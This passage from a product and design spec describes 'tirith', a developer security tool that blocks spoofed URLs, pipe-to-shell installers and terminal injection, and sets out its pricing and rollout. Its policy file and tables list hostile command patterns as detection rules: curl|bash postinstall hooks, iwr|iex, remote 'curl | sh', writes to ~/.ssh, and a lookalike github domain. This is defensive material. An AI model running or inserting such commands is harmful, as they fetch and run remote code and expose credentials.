| `package.json` scripts | `"postinstall": "curl ... \| bash"` |
| `.env.example`, config templates | Spoofed API endpoints, service URLs |

### Modes

- **Diff-only mode (default for PRs):** Only scans changed lines. No noise from existing codebase.
- **Full scan mode:** Scans entire repo. Used for initial onboarding.
- **Baseline file:** `.tirith/baseline.json` stores known accepted findings so large repos can adopt incrementally without being buried in pre-existing issues.

### How it works

- **GitHub App**: comments on PRs when a suspicious URL is introduced in the diff
- **CLI mode**: `tirith scan ./` for local or CI pipeline use
- **GitHub Actions / GitLab CI / CircleCI** integration

### Verified badge

```markdown
[![tirith verified](https://tirith.dev/badge/safe)](https://tirith.dev)
```

Repos scanned by tirith ci can display a trust badge — "This repo contains no spoofed URLs."

### Pricing

| Tier | Price | Includes |
|------|-------|---------|
| Small (up to 10 repos) | $50/mo | PR scanning (diff-only), CLI access |
| Mid (up to 50 repos) | $200/mo | PR scanning, CLI, policy engine, baseline |
| Enterprise (unlimited) | $500/mo | All features, SSO, audit export, SLA |

---

## Paid: tirith monitor

### What it does

Register your domains. tirith continuously monitors for impersonation.

- Newly registered confusable domains (via certificate transparency logs + domain registration feeds)
- Lookalike domains that resolve and serve content
- Lookalike domains with MX records (email interception)
- GitHub repos referencing spoofed versions of your URLs

### How it differs from dnstwist

- dnstwist is a point-in-time CLI scan you run manually
- tirith monitor is **continuous** — alerts within hours of a new threat
- Discovered threats are automatically pushed to the feed, protecting all tirith users

### Actionable alerts (not just notifications)

When a lookalike domain is found, the alert includes:

```
  NEW LOOKALIKE DETECTED
  ============================================================

  Your domain:    example-cli.dev
  Lookalike:      example-clі.dev (Cyrillic і)
  Registered:     2026-01-30 (2 days ago)
  Registrar:      Namecheap
  Hosting:        185.234.xx.xx (Hetzner, DE)
  MX records:     Yes (email interception capable)
  Serves content: Yes (HTTP 200)
  TLS cert:       Let's Encrypt, issued 2026-01-30

  Evidence bundle:
  |- Screenshot of served page
  |- DNS records snapshot
  |- Certificate details
  |- HTTP headers
  |- First seen timestamp

  Actions:
  |- Pre-filled abuse report for Namecheap     [copy]
  |- Pre-filled abuse report for Hetzner       [copy]
  |- Pre-filled Google Safe Browsing report    [copy]
  |- Registrar/hosting contact info extracted
  |- Add to tirith feed blocklist            [done automatically]
```

What maintainers actually need at 2am: not just "we found something" but "here's the evidence bundle and the pre-filled abuse reports."

### Flywheel

```
Monitor customers find threats
       |
       v
Threats feed into tirith feed (automatic)
       |
       v
Feed protects all free users
       |
       v
Free users become ci/feed customers
```

### Pricing

$30/mo per monitored domain.

---

## Team Policy Engine

For organizations that need enforceable rules across developers:

```yaml
# .tirith/policy.yml
version: 1

rules:
  # Hostname checks
  non_ascii_hostname: block           # default, homograph protection
  punycode_domains: block             # default
  mixed_script_in_label: block        # mixed script within same DNS label (excl. hyphen/digits)
  bidi_controls: block                # default
  zero_width_chars: block             # default
  userinfo_urls: block                # default, @ trick protection
  confusable_domains: warn            # visual similarity check
  lookalike_tlds: warn                # .zip, .mov, etc.
  raw_ip_urls: block                  # no http://1.2.3.4/anything
  non_standard_ports: warn            # unexpected ports on known domains

  # Path/URL checks
  non_ascii_in_path: warn             # confusables in URL path
  double_encoding: warn               # nested percent-encoding
  shortened_urls: warn                # flag but allow bit.ly etc.

  # Transport checks
  plain_http_to_sink: block           # http:// + execution sink = no TLS = trivial MITM
  schemeless_url_to_sink: warn        # ambiguous scheme, likely HTTP
  insecure_tls_flags: block           # curl -k, wget --no-check-certificate (with sink)
  insecure_tls_flags_no_sink: warn    # curl -k without sink

  # Command checks
  pipe_to_shell: block                # no curl|bash allowed, period
  dotfile_overwrite: block            # write to ~/.bashrc, ~/.ssh/*, etc.
  dotfile_append: block               # append to ~/.ssh/config, ~/.profile, etc.
  heredoc_to_sensitive_file: block    # heredoc targeting sensitive paths
  download_to_path: warn              # downloading into PATH directories
  archive_extract_exec: warn          # curl | tar x && ./install.sh
  silent_download_pipe: warn          # curl -s | bash
  sudo_sink: warn                     # elevated privilege execution
  remote_pipe: warn                   # ssh host 'curl | sh'
  powershell_download_exec: warn      # iwr | iex, irm | iex

  # Terminal safety
  ansi_escapes_in_paste: block        # default, escape sequence injection
  control_chars_in_paste: block       # default, \r \b tricks
  hidden_multiline_paste: warn        # multi-line paste with hidden commands

  # Environment checks
  proxy_env_elevation: warn           # elevate warnings when proxy env vars detected

  # Special
  allowed_registries:                 # only these for docker pull
    - docker.io
    - ghcr.io
    - gcr.io

  allowed_install_domains:            # only these for curl|bash (if pipe_to_shell is warn, not block)
    - get.example-tool.sh
    - sh.rustup.rs
    - raw.githubusercontent.com

  allowed_package_sources:            # only these for pip/npm from URL
    - pypi.org
    - registry.npmjs.org

  allowed_idn_domains: []            # legitimate IDN domains to permit

  allow_bypass_env: false             # if false, TIRITH=0 is ignored

paranoia: medium
# low:    purely local, no DNS, no network, no disk reads beyond allowlist.
#         Checks: homographs, punycode, mixed-script, control chars, bidi, zero-width,
#         userinfo, insecure TLS flags, plain HTTP to sink.
# medium: local + receipts + heavier tokenization + source-sink analysis.
#         Adds: pipe-to-shell, IP URLs, dotfile clobber, command shape, archive chains,
#         proxy env detection, confusable domains, path homoglyphs.
# high:   network calls with strict timeouts and caching.
#         Adds: shortened URL expansion, redirect chain resolution, domain age,
#         cert age checks. Org policy may restrict high to managed devices only.
```

Policy is distributed via:
- Repo-level `.tirith/policy.yml`
- Org-level via tirith dashboard (pushed to all team members)
- MDM for enterprise environments

Individual developers cannot weaken org policy. They can add personal allowlist entries but cannot override `block` rules set by the org.

---

## Team Activity Dashboard

Available with team feed subscription:

```
This week across your org (14 developers):

  Blocked:        3 homograph attempts
  Warned:         12 pipe-to-shell commands
  Allowed:        847 clean URLs (zero friction)

  Top blocked:    https://xn--gthub-esa.com (Cyrillic і) -- hit by 2 devs
  Top warned:     curl https://raw.githubusercontent.com/... | bash

  New on blocklist: 7 domains targeting your stack

  Receipt activity:
  |- 23 install scripts run via tirith run
  |- 3 scripts changed since last run (re-verification needed)
```

Feeds into SIEM via webhook/syslog export for enterprise.

---

## Privacy Design

- **No command upload by default.** The tool runs entirely locally. Commands, URLs, and audit logs never leave the machine unless explicitly configured.
- **Feed sync is one-way pull.** The client downloads the feed. It does not upload anything.
- **Receipt sharing is opt-in.** Users can choose to share anonymized receipt hashes (URL + SHA256 only, no paths, commands, or environment context) to help detect compromised install scripts. This is off by default and clearly disclosed.
- **Team dashboard ingestion is explicit.** The team tier requires explicit enrollment. Audit log shipping to the dashboard is configured per-machine, not silent.
- **Aggressive redaction.** If any data is shared (opt-in receipt hashes, team audit logs), path components, environment variables, and git branch names are stripped. Only URL, action, and timestamp are sent.

---

## Practical Gotchas (designed around from day 1)

| Gotcha | Design decision |
|--------|----------------|
| False positives on legitimate IDNs | Default block for punycode/non-ASCII hostnames. `allowed_idn_domains` in policy for specific overrides per org. |
| Privacy of pasted commands | Never uploaded. All analysis is local. |
| Bypass attempts (`TIRITH=0`) | Works by default for individual devs. Org policy can disable via `allow_bypass_env: false`. |
| Performance: allowlist-heavy workflows | Allowlist loaded into shell hash map at init. Lookups are O(1), binary never invoked for allowlisted hosts. |
| Performance: redirect resolution | Cached on disk for 5 minutes per URL. Only runs at paranoia `high`. Uses GET with `Range: bytes=0-0`, hard cap 10 redirects / 5s timeout. |
| Performance: DoS via large paste | Max paste length 64 KB (configurable). Max 50 URLs extracted per command. Max 3 normalization rounds. 50ms hard timeout on binary analysis (fail-open with log). |
| Non-interactive environments (CI, scripts, cron) | Never prompt. Default to policy action. Output to stderr only. |
| Shell compatibility | Core logic in Rust binary. Shell hooks are thin (~30 lines each). Tested on zsh 5.8+, bash 5.0+, fish 3.5+. |
| Terminals without bracketed paste | Preexec hook still catches at execution time. Paste guard is defense-in-depth, not the only layer. |
| Static analysis accuracy | Receipt fields like `domains_referenced` and `paths_referenced` are explicitly marked as `"analysis_method": "static"` (inferred). Runtime tracing is a future enhancement. |

---

## Target Audiences

### By ecosystem

| Ecosystem | Why | Install patterns at risk |
|-----------|-----|------------------------|
| DevOps / Infrastructure | Run install scripts as root on production servers | Docker, k3s, Helm, Istio, Linkerd, Tailscale |
| Cloud developers | Machines have AWS/GCP/Azure credentials | AWS CLI, gcloud SDK, Azure CLI |
| Frontend / JavaScript | Largest developer community | nvm, pnpm, Deno, Bun |
| Rust / Systems | Security-conscious, strong word-of-mouth | rustup, cargo-binstall |
| Data science / ML | GPU instances with broad network access, API keys | Ollama, Poetry, Miniconda |
| Web3 / Crypto | Real money at risk via spoofed RPCs and addresses | Foundry, Hardhat, Solana CLI |
| Mobile | App Store signing keys, push certs | SDKMAN, FVM |

### By persona

| Persona | Risk profile |
|---------|-------------|
| Individual developer | Personal credentials, SSH keys, cloud tokens |
| IT admin / sysadmin | sudo access, fleet management credentials |
| Security professional | Installs security tools via curl, best evangelists |
| Open source maintainer | Both a user and a monitor customer |
| Developer educator | Writes tutorials with curl commands copied by thousands |

### By buyer

| Buyer | Product | Why they pay |
|-------|---------|-------------|
| Individual developer | Feed ($7/mo) | New domain alerts, active campaign protection |
| Engineering manager | CI + team feed ($200-500/mo) | Governance, audit trail, repo scanning |
| CISO / Security team | CI + feed + policy ($500+/mo) | Compliance, enforceable rules, SIEM export |
| Open source project | Monitor ($30/mo) | Know when someone impersonates their domain, actionable abuse reports |
| Developer platform (Vercel, Railway) | White-label / API | Protect their users' deploy pipelines |
| Security vendors | Feed API | Integrate tirith data into their product |
| CI/CD platforms (GitHub, GitLab) | Partnership / acquisition | Native integration |

---

## Go-to-Market

| Phase | Target | Channel | Rationale |
|-------|--------|---------|-----------|
| 1 | Rust + Web3 devs | Twitter/X, Farcaster | Security-obsessed, vocal, original problem space |
| 2 | DevOps engineers | Hacker News, Reddit r/devops | Highest risk (sudo curl \| bash), largest surface |
| 3 | Frontend / JS devs | Twitter/X, dev.to | Largest community, nvm/bun/pnpm all use curl installers |
| 4 | Data / ML engineers | Twitter/X, HuggingFace community | Fast growing, Ollama install is massive surface |
| 5 | Enterprise security | Direct sales, CISO newsletters | Where the real revenue is |

---

## Build Phases

| Phase | Ship | What | Why this order |
|-------|------|------|----------------|
| 1 | OSS CLI + shell hook | Rust binary, zsh/bash/fish hooks, paste guard, hidden command detection, all URL checks (hostname: non-ASCII, punycode, mixed-script-in-label, bidi, zero-width, userinfo, confusable, raw IP, non-standard port, lookalike TLD, trailing dot; path: non-ASCII, homoglyph, double-encoding; transport: plain HTTP to sink, schemeless to sink, insecure TLS flags; environment: proxy detection), all command shape checks (full source-sink model incl. PowerShell sinks, archive chains, remote pipes, dotfile append, heredoc to sensitive file), control char / ANSI escape blocking, normalization/deobfuscation layer (with caps), pipe-to-shell safe mode, `tirith run`, install receipts, `tirith why`, `tirith score`, `tirith diff`, ecosystem guards (git, docker, pip, npm, web3), allowlist/blocklist, policy file, audit log | Get adoption, validate detection engine, build community |
| 2 | CI scanner | GitHub App, CLI mode (`tirith scan`), PR diff-only commenting, full repo scan, baseline file, verified badge, GitHub Actions / GitLab CI integration | First revenue — companies pay for CI integration |
| 3 | Threat feed | Feed infrastructure, signed feed delivery (ed25519), transparency log, daily/hourly sync, team dashboard, SIEM export, policy distribution | Requires data collection infra, needs phase 1 users to justify |
| 4 | Domain monitor | Cert transparency monitoring, registration monitoring, automatic feed integration, actionable alerts with abuse report templates + registrar contacts + evidence bundles | Needs feed infra from phase 3, different buyer persona |

---

## Competitive Positioning

```
                        What protects developers HERE?
                                    |
                                    v
Dev reads README --> copies URL --> pastes into terminal --> executes
                                    |
                    +---------------+-------------------+
                    |               |                   |
                 Semgrep          Snyk              Socket.dev
                 scans YOUR      scans YOUR         scans npm/pip
                 source code     dependencies       registries
                 after writing   after installing   during install

                                dnstwist
                                tells DOMAIN OWNER
                                about fakes, not
                                the developer

                              tirith
                              guards THE DEVELOPER
                              at paste time and
                              exec time, catches
                              terminal-specific attacks
                              no browser protects against
```

| Dimension | Semgrep | Snyk | Socket | dnstwist | tirith |
|-----------|---------|------|--------|----------|----------|
| Protects | Code authors | Dep consumers | Package installers | Domain owners | Command executors |
| When | Write / CI time | Build / CI time | Install time | On-demand | Paste + exec time |
| Against | Code vulns | Known CVEs | Malicious packages | Brand impersonation | Spoofed URLs, hostile scripts, terminal injection |
| How | AST matching | Vuln DB lookup | Behavior analysis | Domain permutation | Byte-level URL + source-sink model + terminal escape detection |
| Friction | CI config | CI config | GitHub App / CLI | Manual runs | Zero — transparent hook |

### One-line positioning

Semgrep, Snyk, and Socket protect your code and dependencies. tirith protects **you**, the human, at the moment you paste and hit enter.

### Defensibility

The shell hook alone is replicable. What isn't:

1. **Threat feed** — continuously updated with structurally clean but known-malicious domains. Requires ongoing research, not a one-time script.
2. **Source-sink engine** — models download-to-execution patterns abstractly. Grows as new attack patterns emerge, harder to replicate than a regex list.
3. **CI scanner** — no existing tool scans repos for URL execution surfaces in docs/scripts/configs.
4. **Install receipts** — creates a unique data asset (script hashes over time) that enables change detection across the user base.
5. **Network effect** — monitor customers find threats, threats feed into feed, feed protects free users, free users become customers.

---

## Exit Paths

| Path | Precedent |
|------|-----------|
| CI/CD platform acquisition (GitHub, GitLab) | They want native integration for developer protection |
| Security vendor acquisition (CrowdStrike, Palo Alto) | Endpoint protection for developer machines |
| Independent growth | Feed + CI + monitor recurring revenue |

Socket built their moat with a unique data asset (malicious package detection) that platforms wanted to integrate natively. tirith's data asset is the threat feed + install receipt corpus + source-sink pattern engine at an insertion point nobody else occupies.

---

## Document Structure (for public release)

This spec is comprehensive but too long for casual OSS adopters. For public release, split into:

- **README.md** — Problem, 60-second install, what gets blocked, 3-4 examples. Under 200 lines. The "holy crap" moment should happen fast.
- **docs/design.md** — Threat model, source-sink model, normalization, receipts, fast-path architecture.
- **docs/policy.md** — Policy schema, paranoia tiers, enterprise behaviors, team governance.
- **docs/ci.md** — CI scanner details, diff-only mode, baseline, badge.
- **docs/monitor.md** — Domain monitoring, actionable alerts, evidence bundles.
- **docs/feed.md** — Feed format, transparency log, signing, sync behavior.
